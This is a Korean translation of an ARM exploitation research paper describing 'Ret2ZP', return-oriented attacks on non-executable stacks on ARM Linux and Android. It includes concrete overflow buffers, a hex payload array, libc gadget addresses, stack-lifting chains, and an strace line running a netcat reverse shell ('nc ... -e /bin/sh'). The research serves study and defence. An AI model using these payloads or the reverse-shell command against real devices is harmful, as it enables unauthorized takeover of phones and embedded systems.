+===================================================================================+
		[Non-Executable Stack ARM Exploitation Research Paper]
									Revision 1.0
							Author: Itzhak(Zuk) Avraham
							Translated by mindbl0wer
+===================================================================================+

# 1. 소개

본 문서는 ARM의 스택이 non executable stack인 경우(스택에서 코드 실행이 불가능 한 경우)
공격 방법을 독자들에게 친숙하게 하기 위해서 몇가지 스택 기반 버퍼 오버플로우 공격에 
대해서 설명한다. 

이 연구는 현대 ARM 기반 장비들이 직면한 위험들과 이를 방지하기 위한 몇가지 해결책을 
제안하는 목적으로 진행되었다. 

*Warning*----------------------------------------------------------------------------+
| 본 문서에서는Ret2ZP 공격에 대해서 빠짐없이 설명하고 있다.                          |
| 만약 자신의 ARM장비에 공격을 수행한다면, 장비가 고장이 날 수도 있다.               |
| 저자와 직원들은 독자의 행동에 대해 책임을 지지 않는다.                             |
+------------------------------------------------------------------------------------+

본 문서는 독자들이 X86 또는 ARM어셈블리 언어에 대한 기본적인 지식이 있다는 가정하에 
작성하였다. 그리고 exploit 기법들에 대한 지식은 ret2libc 공격과 같이 non executable
stack을 공격하는 방법들에 대한 이해를 도울 것이다.

	1.1 버퍼는 어떻게 exploit 될 수 있는가? 

스택 오버플로우 문제는 실제 스택에 할당된 버퍼의 크기보다 더 많은 데이터를 쓰려고 
할 때 발생한다. 발생할 수 있는 경우는 다음과 같다.

*사용자가 이미 설치한 어플리케이션이 로컬에서 실행되며 권한을 상승시켜서 모바일 기기의 
 제어를 탈취하는 명령어들을 실행한다. 

*로컬이 아닌 외부 핸드폰에 임의의 명령어를 실행하기 위해서 exploit을 한다.

이 문서에서는 현재 ARM CPU의 보안 매커니즘의 구현에 존재하는 심각한 취약점과 공격
방법에 대해서 설명할 것이다. 취약점과 공격 방법을 설명하는 이유는 보다 더 견고한 커널
기반의 해결책의 구현을 촉구하기 위해서다.

Exploitation이 ARM에서 executable stack을 필요 하는 것처럼 느껴질지 모르지만, 이 것은 
요즘 시나리오가 아니다. 그리고 ARM 공격은 컴퓨터만을 목표로 하는 것이 아니라 텔레비젼,
스마트폰, 태블릿 등 현실 세계에 널리 퍼져있는 ARM 기반 기기들을 대상으로 한다. 

	1.2 ARM이란?

ARM은 ARM Holdings에서 만든 32 bit Reduced Instruction Set Architecture이다. 과거에는 
Advanced RISC Machine 또는 Acorn RISC Machine이라고 알려졌었다. 생산량 측면에서 제일 
많이 사용되고있는 32 bit ISA이며 원래는 데스크탑  PC용 CPU을 목적으로 했었으나 IBM과 
Apple 컴퓨터와 호환되는 x86 시리즈의 프로세서가 현재 데스크탑 시장을 장악하고 있다. 
하지만 상대적으로 단순한 구조가 저전력 어플리케이션에 적합했으며 이 점은 모바일과 
임베디드 시장을 싼 가격과 작은 마이크로프로세서와 마이크로콘트롤러로 장악하게 만들었다.
- en.wikipedia.og/wiki/ARM_architecture

	1.3 Reference

(*A) The APCS ARM Calling Convention
http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042d/IHI0042D_aapcs.pdf
(*B) AlphaNumeric Shellcodes when stack is executable
http://dragos.com/psj09/pacsec2009-arm-alpha.pdf
(*C) Alphanumeric ARM shellcode
http://www.phrack.org/issues.html?issue=66&id=12
(*D) ret2libc c0ntextb tutorial
http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf
(*E) 이 블로그는 본 문서의 업데이트 버젼을 가지고 있다
http://imthezuk.blogspot.com

	1.4 Acknowledgment

이 문서는 이 분들의 도움없이는 작성될 수 었었을 것이다

Ilan Aelion
Moshe Vered
Matthew Carpenter

	1.5 추가 정보

이 문서의 일부분을 인용할 때는 저자들에게 credit을 주고 업데이트된 링크를 레퍼런스로 
제공해야 한다.

문서의 업데이트된 버젼을 보려면 http://imthezuk.blogspot.com을 참고하라

더 많은 정보를 원하면 이 문서의 저자에게 이메일을 보내라
itz2000@gmail.com
twitter/ihackbanme
http://imthezuk.blogspot.com

Itzhak (Zuk) Avraham

#2. ARM 어셈블리

	2.1 배경 지식: Non Executable Stack일 때 x86 과 ARM의 exploitation 비교

최근 많은 새로운 플랫폼은 코드 실행이 non executable stack을 가지고 있고, 따라서 그들을 
공격하는 것은 과거보다 매우 어려워졌다. 또한, ARM 어셈블리어는 x86 어셈블리어와 다르다.
X86에서는  EBP,EIP 값을 덮어씌워서 프로그램의 실행 흐름을 바꾸거나(예를 들면 return to 
libc (*D)), 아니면 함수의 실행 경로를 바꾸기도 하고 심지어 패러미터를 더할수도 있다. 

저자가 이 글을 쓰고 있는 시점에 알고 있는 바로는, ARM 의 non executable 스택 exploitation
기법에 관한 공개적인 정보나 문서는 없다. 따라서, 이 연구는 새로운 분야를 개척했다고 할 수 
있다. 

	2.2 ARM Calling Convention (APCS)
 
ARM의 표준 Calling Convention은 16개의 레지스터를 다음과 같이 할당한다.

R15: Program Counter (PC)
R14: Link Register (LR)
R13: Stack Pointer (SP)
R12: Intra-Procedure-call scratch register (IP)
R11: Frame Pointer (FP)
R4 ~ R10: 지역 변수 저장
R0~R3: 함수의 매개변수로 사용

만약 SYSTEM() 을 호출 하고 싶다면,  매개변수는 R0 레지스터를 통해서 전달하게 된다.

함수가 호출될 때 매개변수가 스택에 push 되지 않았기 때문에(다른 calling convention의 사용) 
스택에서 매개변수들을  pop시킬 필요가 없다. 이 것은 함수에 매개변수를 전달하는 방식이 
X86과는다르다는 것을 의미한다. 성공적으로 ARM에서 버퍼 오버플로우 공격을 하기 위해서는 
매개변수들을 다른 방법을 통해서 수정해야 한다. 그 방법들은 뒤의 섹션에서 설명하겠다.

	2.3 왜 기존의 ret2libc (return to libc) 공격은 올바르게 동작하지 않는가?

Non-executable 스택을 공격한다는 것은 무엇을 의미하는가? 함수 매개변수들은 X86에서 스택에 
순서에 따라 push하는 것과는 다른 방법으로 위치시켜야 한다.

예를 들면, 기존의 X86 return to libc 공격은 다음과 같을 것이다.

+----------+-----------+------------+-----------------+-------------+
|  16 A's  |   AAAA    |   System   |  Exit function  |  &/bin/sh   |
|----------|-----------|------------|-----------------|-------------|
|  args    |  EBP[20]  |  EIP[24]   |    EBP+8 [28]   | EBP+12 [32] |
+----------+-----------+------------+-----------------+-------------+

EBP 값을 제어할 수 있고 (Frame faking에 사용할 수 있다) 함수 콜 system(buf), 매개변수는
(&/bin/bash), exit 함수는 system(buf) 이후에 실행된다.

	
	2.4 취약한 함수 이해하기

ARM에는 취약한 함수의 종류에 따라서 expoit을 할 수 있는 방법이 여러가지 있다.

(1) 취약한 함수가 반환 값이 없을 때
(2) 취약한 함수가 반환 값이 없지만, 매개변수 R0~R3를 가지고 어떤 연산을 할 때
(3) 취약한 함수가 어떤 값을 반환할 때

뒤의 챕터에서는 이런 종류의 함수를 어떻게 exploit 하는지, 다시 말하면 취약한 함수를 
어떻게 이용하여 어떻게 버퍼의 크기를 줄일수 있는지 설명하겠다.

#3. ARM Exploitation

	3.1 PC 제어하기

Exploit 하는 것은 쉬울 수도 있지만 까다로울 수도 있다.
왜 까다로운지는 실제 exploit이 왜 가능한지, 그리고 PC (Program Counter, X86에서 EIP)를
어떻게 제어할 수 있는지를 먼저 설명한 후에 말하겠다. 

함수를 호출하면, 어떤 매개변수들은 레지스터로 이동하고 (R0~R3)[어떤 flag로 컴파일하느냐에 
따라 다르지만 대부분 똑같다] 스택으로 push되지 않는다.

func라는 2개의 매개변수를 전달받는 함수의 호출은 다음과 같다

mov R0, R3
mov R1, R2
b1 func ; See **

**X86에서 call 명령어와 비슷하다(bl 에서 l은 Branch with Link 라는 뜻으로, 다음 명령어의 
주소가 LR레지스터에 저장이 되고, 함수로부터 return할 때 이 값을 PC 레지스터로 읽어온다).

보면 알 수 있듯이, 함수에게 매개변수를 R0,R1레지스터를 통해서 전달했다[얘기했듯이 컴파일 
시 flag 설정에 따라 다르지만 보통 경우에 해당한다]. 

하지만 함수 안으로 들어가면 어떻게 되는가?

push {R4, R11(FP), R14(LR)} ; in x86 : push R4\n push R11\n push R14
add FP, SP, #8 ; FP = SP+8
...

R4는 스택에서 SP가 가르키고 있는 곳 바로 다음에 push 되었다. 또한 R11 (frame pointer)와 
Link Register도 스택에 다음과 같은 순서에 따라 push되었다.

상위 메모리 <------------ 하위 메모리
스택이 자라는 방향 ----------------> 

==| R4 | R11 | LR |
==* <--- 스택 포인터가 함수가 호출 되었을 때 가르키고 있는 곳

함수의 마지막 부분을 살펴 보자

sub SP,FP,#8 ; 0x8
pop {R4,FP,PC} ; in x86 : pop R4\n pop FP \n pop PC\n
.word 0x00008400 ; data function is using stored here
.word 0x. . . . . . . . ; 계속 
. . . . . . . . . . . . ; 

함수에 들어오면서 스택에 push 되었던 LR이 함수가 끝나면서 PC 로 pop이 된다. 따라서,만약
오버플로우가 일어난다면, 다음 명령어의 주소가 수정된 후에 pop이 되기 때문에 PC를 마음대로
제어할 수 있다.

만약 우리가 ret2libc 공격을 했다면 실패했을 것이다. 왜냐하면 매개변수가 pop이 되지 않기 
때문이다. 우리는 몇가지의 기술을 통해서 함수를 호출하기 전에 매개변수들를 제어할 것이다. 

우리는 이런 공격을 Ret2ZP (Return to Zero Protection)이라고 부르겠다. 이 공격은 Return
Oriented Programming, Return to Libc 그리고 몇 가지 컴퓨터를 제어하는 기술들의 조합이라고
할 수 있다.

	3.2 Ret2ZP (Return to Zero Protection)의 자세한 설명

우리는 PC 값을 제어할 수 있다는 것과 매개변수를 전달할 수 없다는 것을 눈으로 확인했다.
이제 Ret2ZP이 어떻게 동작하는지 설명하겠다.

아래 그림은 스택이 오버플로우되었을 때 버퍼와 스택의 모습을 표현한 것이다.
+--------------+------------+------------+--------------+-----------------------+
| 16 A's       |   BBBB     |   CCCC     |     DDDD     | &function-(0x12345678)|
|--------------|------------|------------|--------------|-----------------------|
|   args       |  junk[20]  |     R4     |   R11- FP    | prog - counter (PC)   |
+--------------+------------+------------+--------------+-----------------------+

다음과 같은 버퍼를 프로그램이 입력받으면,
AAA.....(16개)BBBBCCCCDDDD\x78\x56\x34\x12
실행흐름을 0x12345678로 바꾸고 R4을 0x43434343, R11을 0x44444444로 바꿀 수 있다.

만약 우리의 코드를 유지하고 RoP (return oriented programming)을 하기를 원한다면,
코드로 return을 하면 된다 -->(얼만큼의 매개변수가 push되는지 (만약 있다면), 
그리고 &function 이후에 스택 포인터가 조절이 안되어있는지(매우 중요하다)에 결정
된다)

다른 함수(system("/bin/bash") 처럼)로 이동하는 것과 PC로 부터 다른 코드로 점프
하는 것은 무엇이 다른가?

	3.3 Ret2ZP - 로컬 공격자

로컬에서 명령어를 실행하고 원하는 곳에 쓸 수 있으려면 쉘이 필요하다. 우리는 화려한
remote shell이나 netcat, /dev/tcp 같은 것은 필요없다.

Return Oriented Programming과 stack lifting (우리 코드를 덮어씌우지 않기 위해), 
그리고 매개변수를 조절하여 Ret2ZP 공격을 해보도록 하자

실질적으로 우리에게 필요한 것은 무엇일까?

1. "/bin/bash" 문자열의 주소, libc를 통해서 쉽게 얻을수 있다
2. buffer와 동기화된 상태를 유지하기 위해 stack lifting이 필요하다
3. 주소를 R0 레지스터에 저장하는 방법 (스택에 있지 않음, libc로부터 얻은 &/bin/bash)
4. return 주소를 system함수를 가르키도록 만드는 것

1.쉽다
2.wprintf 앞부분에서 얻을 수 있다. 다음 섹션에서 설명하겠다

하지만 이 경우에는 꼭 필요하지는 않다... 우리는 이런 것 없이도 흐름을 제어할 수 있고
여기서 동기화를 꼭 할 필요는 없다.

이제 PC를 제어하면서 매개변수를 R0으로 전달하는 방법을 보자

어떻게 할 것인가?? 최소한 R0과 PC를 포함하는 POP 명령어를 찾아서 점프를 하도록 하자.
더 많은 레지스터를 pop할수록 제어가 더 편해지지만 지금은 R0과 PC만 제어하면 된다.

R0는 문자열 /bin/bash의 주소를 저장하고 있고, PC는 system 함수를 가리키고 있어야 한다.
아래는 libc에서 R0과 PC를 pop하는 명령어를 포함하는 부분이다. libc를 선택한 이유는 
없다. 다른 곳에서 pop 명령어를 찾을 수도 있겠지만, 정적 주소인지 확인해라!!

저자가 찾은 것은 다음과 같다.

0x41dc7344 <erand48+28>:	b1 0x41dc74bc <erand48 r>
0x41dc7348 <erand48+32>:	ldm SP, {R0,R1} <== 우린 이곳으로 점프해야 한다. 
						    R0를 &/bin/bash를 기리키게 하자
0x41dc734c <erand48+36>:	add SP, SP, #12; 0xc
0x41dc7350 <erand48+40>:	pop {PC} ==> 여기서 빠져나가도록 하자

이제 모든 것이 갖추어 졌으니 공격을 하도록 하자.
공격 버퍼는 다음과 같을 것이다.

+---------+------+---------+---------+----------+------------+------+------+-------+
| 16 A's  | BBBB |   R4    |   R11   |&41dc7348 | &/bin/bash | EEEE | FFFF |&system|
|---------|------|---------|---------|----------|------------|------|------|-------|
| args    | junk |   R4    |   FP    |   PC     |    R0      |  R1  | lift |  PC   |
+---------+------+---------+---------+----------+------------+------+------+-------+

AA....(16개)BBBBCCCCDDDD\x48\x73\xdc\x41\xe4\xfe\xea\x41EEEEFFFF\xb4\xe3\xdc\x41 

또는

char buf[]="\x41\x41\x41\x41"
	   "\x41\x41\x41\x41"
	   "\x41\x41\x41\x41"
	   "\x41\x41\x41\x41"   // 16개의 A
	   "\x42\x42\x42\x42"   // buf 채우기
	   "\x43\x43\x43\x43"   // function 에서 나갈 때 사용되는 param1
	   "\x44\x44\x44\x44"   // R11
	   "\x48\x73\xdc\x41"   // R0,R1에 저장하는 코드 위치
	   "\xe4\xff\xea\x41"   // R0
	   "\x45\x45\x45\x45"   // R1
	   "\x46\x46\x46\x46"   // junk
	   "\xb4\xff\xdc\x41"   // system 함수의 주소

system 함수에 breakpoint을 걸어서 레지스터들의 값을 보면 다음과 같다.

R0 = 0x41eaffea; (&/bin/sh)
R1 = 0x45454545
R4 = 0x43434343
R11 = 0x44444444

system 함수가 호출되면 /bin/sh를 실행시킬 것이다.
이것은 로컬 공격에 효과적이지만, 우리는 remote 쉘을 얻는 것도 원한다!

	3.4 Ret2ZP 리모트 공격자  
 
로컬 공격은 좋지만, 우리는 remote에서 명령어를 실행하기를 원하고(훨씬 좋지않은가)
그리고 물론 로컬에서도 사용할 수 있기를 원한다. 더 연구를 해보자.

예를 들어서, 만약 R0를 /bin/sh 문자열을 가리키게 했고 버퍼의 사이즈가 [64]라면,
system 함수가 우리의 스택을 뭉게버릴 것이기 때문에 ([16]같은 작은 사이즈의 버퍼를
사용하는 경우는 제외. 이 경우 버퍼가 공유 DWORD를 갖기 때문에 system 함수
에 의해 공유 DWORD가 훼손되지 않는다.) 우리의 명령어는 실행이 되지 않을 것이다!!
우리는 self stack smashing을 우회하기 위해 약간의 기술이 필요하다.

우리가 R4,R5,R6 그리고 LR(나중에 PC로 변환)을 사용하는 어떤 함수를 호출한다고 
가정하자. 그렇다면 버퍼는 다음과 같이 생길 것이다.

+---------+------+---------+---------+----------+------+-------+------+--------+
| 16 A's  | BBBB |   R4    |   R11   |&function |  R4  |   R5  | FFFF |&2ndfunc|
|---------|------|---------|---------|----------|------|-------|------|--------|
| args    | junk |   R4    |   FP    |   PC     | arg 1| arg 2 |arg 3 |  PC    |
+---------+------+---------+---------+----------+------+-------+------+--------+

직접적으로 바로 함수로 jump를 할 수가 없다, e.g SYSTEM. 스택이 훼손되기 때문에
함수로 jump를 하기 전에 약간의 수정을 해야한다. 

SYSTEM은 고유 스택의 ~384 bytes 영역을 사용한다. 만약 버퍼의 크기를 [16]로 하면
공유 4 bytes를 갖는다[만약 우리가 *(SYSTEM+4)로 jump 한다면. 물론 가능한 경우이다]

덮어씌워지지 않은 DWORD로 jump하는 것은 로컬에서 권한 상승 공격을 할 때만 좋을 
수 있지, remote 공격에서는 의미가 없다(경로 path에 쓸 수 있는 경우를 제외)

e.g: "sh;#AAAAA...." 명령어를 실행하면 (첫번째 DWORD를 사용할 수 있다), sh;#이 
실행되고 null 문자에 다다를 때까지 # 이후의 모든 것을 무시한다.
첫 번째 DWORD 이후의 버퍼는 덮어씌워진다. 다음 예를 살펴보자

from strace: [pid  3892] execve("/bin/sh", ["sh","-c","sh;#X\332\313\276"...],
[/*19 vars*/])=0

버퍼는 sh;#AAAAA....를 가지고 있었고, 그리고 실제로는 다음을 실행했다: 
sh;#X\332\313\276"...\0 --> 왜냐하면 SYSTEM이 스택의 이부분을 자신의 용도로
사용을 했고 훼손을 했기 때문이다. 

우리는 SYSTEM 함수의 전후로 스택을 384 bytes를 이동(stack lifting)해야 
remote 명령어 (예를 들면 set password, nc, rm -rf ) 실행할 수 있다.

저자는 Ret2ZP 공격을 성공시키기 위해 libc에서 stack을 lift 하기 위한 부분을 
찾기 시작했다.

독자들을 위해 일반적인 것을 찾고 있었고, wprintf 함수의 뒷 부분을 살펴보자

41df8954: e28dd00c	add SP,SP, #12; 0xc
41df8958: e49de004	pop {LR} ; (ldr LR,[SP],#4) <--이 곳으로 jump해야 한다
				 ;  LR = [SP]
				 ;  SP +=4

41df895c: e28dd010	add SP,SP,#16 ; 0x10 <-- 스택은 여기서 lift 된다!! 
41df8960: e12fff1e	bx LR ; <-- 여기서 함수를 빠져나간다
41df8964: 000cc6c4	.word 0x000cc6c4

libc.so 에서 첫번 째 찾은 것이고 정확히 저자가 원하는 것이다!
우리는 원하는 만큼 0x41df8958로 jump(pop {LR} 또는 0x41df8954로 jump를 할 수
있지만 return 값을 조절해야 한다)해서 스택을 적당한 만큼 lift 시키면 된다.

스택을 고친 후에 바로 SYSTEM으로 jump를 하면 된다. 이 완벽한 Ret2ZP !!!
 
첫 번째 경우, 취약한 함수를 종료하면서 R0가 SP를 가리키고 있을 때 위에서 설명한
방법을 통해서 R0값을 고쳐나가면서 첫 lift로부터의 호출을 유지한다.

만약 우리가 제한적인 사이즈의 버퍼를 가지고 있다면, SP를 쓸 수 있는 다른 영역
(writable region)을 가리키게 한다(call 한번으로 해결된다). 이 방법도 lift 하는 
양의 조절에 사용 가능하다. 

먼저 bx LR 이 무슨 뜻인지 설명하겠다.
bx {LR}은 조건 없이 무조건 LR(다음 명령을 실행할 때 SP+4를 가리킨다)로 jump를 
하겠다는 뜻이다. 만약 LR[0]=1 이라면 Thumb 모드로 바뀐다. ARM은 역시 멋지다!

다음과 비슷하게 버퍼가 생겼을 것이다.

+--------+------+----+-----+-----------+-------------+-------------+------+--------+
| 16 A's | BBBB | R4 | R11 |&0x41df8958|..&0x41df8958|&0x41df8958..| AAAA |&SYSTEM |
+--------+------+----+-----+-----------+-------------+-------------+------+--------+
| args   | junk | R4 |  FP |    PC     | again lift  | lift n times|after |PC after|
|        |      |    |     |           |             |             |lift  | lift   |
+--------+------+----+-----+-----------+-------------+-------------+------+--------+

충분한 stack lifting 이후에 우린 다음과 같은 결과를 얻게 될 것이다.

from strace: [pid 3843] execve("/bin/sh",["sh", "-c", "AAAABBBBCCCCDDDDEEEEFFFF
GGGGHX\211\337A"...],[/* 19 vars */])=0

그리고 우린 무엇이든지 실행할 수 있는 버퍼의 크기 [16] + 8 bytes의 공간이 있다
(remote 공격을 하기에도 충분한 공간이다).

i.e:
from strace: [pid 3847] execve("/bin/sh", ["sh","-c","nc 192.168.0.1 80 -e /bin/sh;
\211\337A"...],[/* 19 vars */])=0

	3.5 Ret2ZP - R0..R3 조절하기

다른 시나리오:

(2) 취약한 함수가 반환값은 없지만, R0..R3 레지스터를 이용해서 어떤 행동을 한다
    (반환값이 있는 함수도 마찬가지)

이런 경우에 Ret2ZP 공격을 하고 싶다면, 취약한 함수가 return을 한 후에 레지스터의
상태를 살펴봐야 한다.

공격자는 문자열의 조작 이후에 R0가 있던 상대적인 곳을 가리키는 레지스터 한 개가 
필요하다. 그리고 Ret2ZP를 사용해서 매개변수를 조절하고 스택을 shift를 한다음
payload를 실행하면 된다. 이 방법은 버퍼로 전달되는 복잡한 명령어를 실행하기에도
좋다. 하지만 더 단순한 것을 원한다면 다음과 같은 것을 사용할 수 있다.

로컬 공격에서 사용했듯이, 실행흐름을 erand48 함수의 뒷부분 같은 것을 사용해서
제어할 수 있다.

.text:41DC7348		LDMFD SP, {R0,R1}; <== R0 & R1 조절되었다
.text:41DC734C		ADD SP,SP, #0xC ;  stack을 12 bytes 조정했다 
					   4 bytes 의 junk가 남아있다
.text:41DC7350		LDMFD SP!, {PC};   junk 다음의 4 bytes가 가리키는 곳으로 이동


상대 경로를 찾을 때, 다음 레지스터를 참고하기를 바란다.

+--------------------------------------------------------------------------------+
|레지스터 	|동의어		|함수 호출에서 하는 역할                         |
+--------------------------------------------------------------------------------+
| R15   	| PC		| Program Counter                                |
| R14		| LR		| Link Address (Link Register)/Scratch Register  |
| R13		| SP		| Stack Pointer. 현재 스택프레임의 제일 아래 주소|
| R12		| IP		| The Intra-Procedure-call Scratch               |
| R11		| FP/v8		| Frame Pointer / Variable Register 8            |
| R10		| sl/v7		| Stack Limit   / Variable Register number       |
| R9		| sb/tr/v6	| Platform register 플랫폼 표준에 의해 정의      |
+--------------------------------------------------------------------------------+

이와 같은 방법은 하기가 상당히 쉽고, libc에는 R0..R3값을 조절하기 위한 좋은 코드들이
많다. 그리고 R0..R3 레지스터로 pop을 libc.so 코드의 일부분을 통해서 수행할 수 있다. 
이것은 공격 대상 기기의 제어권을 획득하기에 충분하다.

예를 들면, MCOUNT 함수의 뒷부분을 이용해 R0..R3 레지스터로 pop을 할수가 있다.

.text:41E6583C mcount
.text:41E6583C 		STMFD SP!, {R0-R3,R11,LR} ; 다른 이름은 _mcount 이다
.text:41E65840 		MOVS R11,R11
.text:41E65844		LDRNE R0, [R11,#-4]
.text:41E65848		MOVNES R1, LR
.text:41E6584C		BLNE mcount_internal
.text:41E65850		LDMFD SP!, {R0-R3,R11,LR} <==이 곳으로 jump하면 R0-R3,R11
						     LR 레지스터를 control할 수 있다
.text:41E65854		BX LR
.text:41E65854 ; mcount의 끝

만약 오버플로우를 통해서 SP/R0..R3 값을 수정하는 것이 금지된다면, 함수안에 이미
포함된 다른 함수 또는 명령어들밖에 실행할 수가 없다.

일반적인 ret2libc 공격에서 매개변수를 올바르게 전달하지 않을 경우 에러가 발생하는
것 처럼, 제한된 payload들을 사용하여 매개변수를 올바르게 조절해야만 한다(i.e:
/bin/sh 또는 다른 함수를 실행). 또는 함수를 원하는 방식으로 호출하거나, 하고 싶은
동작을 하게 만들 수 있는 정적 공간이 있다. 예로는 스택을 executable stack으로 
만들어서 2차 payload를 호출하는 방법이 있다.

	3.6 Ret2ZP - 공격을 사용하여 스택을 executable stack으로 만들기

공격자는 Ret2ZP 공격을 통하여 MPROTECT()의 매개변수를 수정해 제어하고 있는 스택영역의
execution bit를 추가할 수 있다. 그 다음, 스택으로 jump를 해 준비한 shellcode를
실행한다. (alphanumeric shellcodes to ARM (*B) 문서를 참고하라. 하지만 X86가 훨씬
발전했다)

	3.7 Ret2ZP - 안드로이드 기반 폰 해킹하기

일반 리눅스와 안드로이드는 많은 공통점을 가지고 있다. 안드로이드 사람들은 libc를
안드로이드 환경에 맞게 다시 컴파일을 하였다. 한가지 쉽게 알아차릴 수 있는 것은
"pop .*R0 .*" 와 같은 명령어가 없다는 것이다(저자가 찾아본 libc 버젼에는 없었다)

그렇다면 어떻게 /system/bin/sh (/bin/bash 의 안드로이드 버젼이다)를 R0에 저장할 
것인가? 약간 까다롭지만 기본적인 아이디어는 같다.

다음 예는 R0를 제어하는 방법을 보여준다

mallinfo
STMFD	SP!,{R4,LR}
MOV	R4,R0
BL	.j_dlmallinfo
MOV	R0,R4
LDMFD	SP!,{R4,PC} <-- 이 곳으로 jump를 하자
; mallinfo 함수의 끝

pop R0 명령어가 없기 때문에 R4를 조절한 다음 jump에 R0로 저장을 한다.

자! 이제 화살표가 가리키는 곳으로 jump를 해서 R4에 "/system/bin/sh" 문자열의 주소를
저장하자. 그러면 R4는 문자열을 가리키고 있고 우린 아직 PC값을 제어할 수 있다.하지만
이것으론 충분하지 않다. 아래 화살표로 jump를 하자.

mallinfo
STMFD	SP!,{R4,LR}
MOV	R4,R0
BL	j_dlmallinfo
MOV	R0,R4 <-- 이 곳으로 jump 하자
LDMFD	SP!,{R4,PC}
; mallinfo 함수의 끝

이제 R4는 R0로 복사되었고, 이제 R0은 "/system/bin/sh"를 가리키고 있다.
다음 명령어는 또 다른 4 bytes를 R4로 저장하고(사실은 필요없다) 그리고 다음 함수의
주소(&system)를 PC로 저장한다. 결과적으로 우리에게 쉘을 줄 것이다. 

결과적으론 ARM의 공격기법과 같다. 위에서 설명했던 이론들은 이 안드로이드 시나리오에서도
통한다. 

공격자는 -fno-stack-protecter로 컴파일(아니면 brute force/cookie guessing/
cookie overwrite 같은 방법으로 우회할 수 있다) 그리고 동적 linking이 된 안드로이드 
프로세스가 필요하다(공부 목적으로 자기 안드로이드를 이용해라!). ARM 리눅스(일반 libc)
에서 확인된 모든 이론은 안드로이드에서도 적용된다(위 처럼 조금의 수정이 가해진다면).

다음 단계는 실행가능한 영역에서 쉘코드를 복사하고 실행시키는 것이다.

#4. 결론

오늘날의 세계에는 ARM은 엄청 흔하고 많은 프로그램이 ARM에서 실행된다. 본 문서에서는
ARM의 스택이 non executable stack 일 경우 exploit할 수있는 몇가지 방법을 소개했다.

문서에서 설명한 모든 예들은 테스트되었고, 올바르게 실행하는 것을 확인했다. ARM과
작업을 한다는 것은 스택 오버플로우로부터 안전하다는 것을 뜻하지 않는다. 그리고 
문서에 쓰여진 payload들은 공격자가 원하는 바로 그것이고, 코드를 쓸 때 버퍼와 관련된
명령어들은 항상 사이즈를 확인하고 안전하게 코딩해야 한다(strcpy,memcpy 같은 함수들은
조심해야 한다).

안전한 코딩 습관은 위험을 줄일 수 있다. 하지만 스택을 실행 불가능하게 하는 것은 
충분하지 않다. 본 문서에서 보여줬듯이, 더 많은 보안 매커니즘을 추가하는 것이 필요하다.  